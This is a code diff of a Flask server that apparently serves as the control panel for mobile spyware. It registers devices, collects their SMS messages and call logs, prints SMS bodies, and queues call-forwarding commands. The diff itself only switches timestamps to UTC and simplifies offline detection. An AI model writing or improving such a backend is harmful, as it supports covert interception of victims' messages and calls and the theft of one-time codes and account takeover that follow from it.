@@ -16,7 +16,7 @@ call_store = {}     # device_id -> list of calls
 command_queue = {}  # device_id -> {"command": "CALL_FWD", "data": {...}}
 
 # ==========================================
-# 1. REGISTER API
+# 1. REGISTER API (WITH UTC TIME FIX)
 # ==========================================
 @app.route('/api/register', methods=['POST'])
 def register():
@@ -25,8 +25,8 @@ def register():
     if not device_id:
         return jsonify({"error": "No device_id"}), 400
     
-    # Last seen update
-    data['last_seen'] = datetime.now().isoformat()
+    # ✅ FIX: UTC time with 'Z' indicator
+    data['last_seen'] = datetime.utcnow().isoformat() + 'Z'
     data['status'] = 'Online'
     
     if device_id in devices:
@@ -35,7 +35,7 @@ def register():
             if value:
                 devices[device_id][key] = value
         devices[device_id]['status'] = 'Online'
-        devices[device_id]['last_seen'] = datetime.now().isoformat()
+        devices[device_id]['last_seen'] = datetime.utcnow().isoformat() + 'Z'
     else:
         # New device
         devices[device_id] = data
@@ -58,7 +58,7 @@ def receive_sms():
             sms_store[device_id] = []
         
         if 'timestamp' not in data:
-            data['timestamp'] = datetime.now().isoformat()
+            data['timestamp'] = datetime.utcnow().isoformat() + 'Z'
         
         sms_store[device_id].append(data)
         print(f"[+] SMS from {device_id}: {data.get('body', '')[:30]}...")
@@ -79,7 +79,7 @@ def receive_call():
             call_store[device_id] = []
         
         if 'timestamp' not in data:
-            data['timestamp'] = datetime.now().isoformat()
+            data['timestamp'] = datetime.utcnow().isoformat() + 'Z'
         
         call_store[device_id].append(data)
         print(f"[+] Call from {device_id}: {data.get('type')}")
@@ -88,12 +88,12 @@ def receive_call():
     return jsonify({"error": "Device not found"}), 404
 
 # ==========================================
-# 4. DEVICES LIST API (Dashboard) - WITH AUTO OFFLINE DETECTION
+# 4. DEVICES LIST API (AUTO OFFLINE + UTC)
 # ==========================================
 @app.route('/api/devices', methods=['GET'])
 def get_devices():
     device_list = []
-    current_time = datetime.now()
+    current_time = datetime.utcnow()  # ✅ UTC time for comparison
     
     for device_id, info in devices.items():
         # Auto offline check (if last_seen > 5 minutes => mark offline)
@@ -102,13 +102,9 @@ def get_devices():
         
         if last_seen:
             try:
-                # Parse last_seen (ISO format)
-                if 'T' in last_seen:
-                    # Remove timezone info if present
-                    last_seen_clean = last_seen.replace('Z', '+00:00')
-                    last_time = datetime.fromisoformat(last_seen_clean)
-                else:
-                    last_time = datetime.strptime(last_seen, '%Y-%m-%d %H:%M:%S')
+                # Clean the string (remove 'Z' if present)
+                clean_time = last_seen.replace('Z', '')
+                last_time = datetime.fromisoformat(clean_time)
                 
                 # If last seen > 5 minutes, mark offline
                 if (current_time - last_time).total_seconds() > 300:  # 5 minutes
